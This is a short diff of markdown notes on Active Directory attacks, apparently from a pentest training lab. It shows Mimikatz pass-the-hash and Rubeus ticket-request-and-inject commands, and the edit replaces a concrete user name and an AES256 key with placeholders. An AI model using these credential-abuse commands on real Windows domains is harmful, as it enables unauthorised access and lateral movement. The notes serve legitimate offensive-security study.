@@ -60,7 +60,7 @@ Invoke-Mimi -Command '"sekurlsa::pth /user:<ADMIN USER> /domain:<DOMAIN> /ntlm:<
 ```
 or using Rubeus
 ```cmd
-C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\AD\Tools\Rubeus.exe asktgt /user:<ADMIN USER> /aes256:>aes256 HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 Launch Invishell e establish the session
 ```powershell
